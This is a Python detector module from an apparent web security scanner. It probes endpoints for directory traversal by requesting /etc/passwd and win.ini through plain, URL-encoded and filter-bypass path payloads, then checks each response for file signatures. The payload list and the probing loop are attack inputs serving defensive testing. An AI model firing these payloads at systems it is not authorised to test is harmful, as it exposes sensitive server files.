"""
Directory Traversal & Local File Inclusion (LFI) Detector.

Tests:
1. Classic ../ path traversal to /etc/passwd and C:\\Windows\\win.ini.
2. URL-encoded path traversal (..%2f..%2f..%2f).
3. Filter-bypass path traversal (....//....//).
4. Automated parameter synthesis against download, file, and resource endpoints.
"""

from urllib.parse import urlparse, urljoin
from typing import List

from scanner.detectors.base_detector import BaseDetector, DetectorResult
from scanner.models.test_state import TestState
from scanner.models.finding import StandardFinding, CVSSInfo
from scanner.models.evidence import RequestEvidence, ResponseEvidence, Evidence, safe_body_snippet
from scanner.models.confidence import ConfidenceLevel, ConfidenceResult


TRAVERSAL_PARAMS = [
    "file", "path", "doc", "page", "read", "download", "folder",
    "view", "template", "include", "item", "filename", "filepath"
]

TRAVERSAL_PAYLOADS = [
    "../../../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//....//etc/passwd",
    "C:\\Windows\\win.ini",
    "..\\..\\..\\..\\..\\..\\Windows\\win.ini",
    "..%5c..%5c..%5c..%5cWindows%5cwin.ini",
]


class DirectoryTraversalDetector(BaseDetector):
    name = "Directory Traversal Detector"
    category = "Broken Access Control"
    cwe = "CWE-22"
    owasp = "A01:2021-Broken Access Control"

    def _run(self, endpoints, engine, auth_context, baseline_measurer) -> DetectorResult:
        result = DetectorResult()
        
        target_base = endpoints[0].url if endpoints else "https://target"
        parsed_base = urlparse(target_base)
        origin_url = f"{parsed_base.scheme}://{parsed_base.netloc}"

        candidate_urls = []
        for ep in endpoints:
            candidate_urls.append(ep.url)

        common_file_paths = ["/", "/api/download", "/download", "/api/file", "/file", "/api/view", "/view", "/docs", "/api/document"]
        for path in common_file_paths:
            full = urljoin(origin_url, path)
            if full not in candidate_urls:
                candidate_urls.append(full)

        result.test_state = TestState.PASS
        findings: List[StandardFinding] = []
        tested = 0
        blocked = 0

        for test_base in candidate_urls[:8]:
            parsed = urlparse(test_base)
            base_clean = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

            for param in TRAVERSAL_PARAMS[:4]:
                for payload in TRAVERSAL_PAYLOADS:
                    test_url = f"{base_clean}?{param}={payload}"
                    tested += 1

                    req_result = engine.request("GET", test_url)

                    if req_result.is_error:
                        continue
                    if req_result.is_blocked:
                        blocked += 1
                        continue

                    body = req_result.body
                    if "root:x:0:0" in body or "[extensions]" in body or "[fonts]" in body:
                        confidence = ConfidenceResult(ConfidenceLevel.CONFIRMED, "Found system file signatures (/etc/passwd or win.ini) in response body")
                        cvss = CVSSInfo(score=7.5, vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", severity="HIGH")
                        finding = StandardFinding(
                            title=f"Directory Traversal via '{param}' Parameter",
                            description=f"Path traversal confirmed at {test_url}. Sensitive operating system files are readable.",
                            severity="High",
                            cwe=self.cwe,
                            owasp=self.owasp,
                            cvss=cvss,
                            confidence=confidence,
                            endpoint=test_url,
                            method="GET",
                            parameter=param,
                            remediation="Validate user input against a strict whitelist of permitted files, use basename sanitization, and resolve absolute paths safely.",
                            evidence=[Evidence(
                                request=RequestEvidence(method="GET", url=test_url),
                                response=ResponseEvidence(status_code=req_result.status_code, headers=req_result.headers, body_snippet=safe_body_snippet(body))
                            )]
                        )
                        findings.append(finding)
                        break
                if findings:
                    break
            if findings:
                break

        vuln_findings = [f for f in findings if f.status == TestState.VULNERABLE or f.severity != "INFO"]
        if vuln_findings:
            result.test_state = TestState.VULNERABLE
            result.findings = vuln_findings
            result.details = f"Detected {len(vuln_findings)} directory traversal vulnerability/vulnerabilities."
        elif blocked >= tested and tested > 0:
            result.test_state = TestState.BLOCKED
            result.details = f"All {blocked} path traversal test probes were blocked by WAF."
        else:
            result.test_state = TestState.PASS
            result.details = f"Tested {tested} parameter combinations across file & resource endpoints: path traversal attempts are safely rejected."

        result.endpoints_tested = max(tested, 1)
        result.endpoints_blocked = blocked
        return result
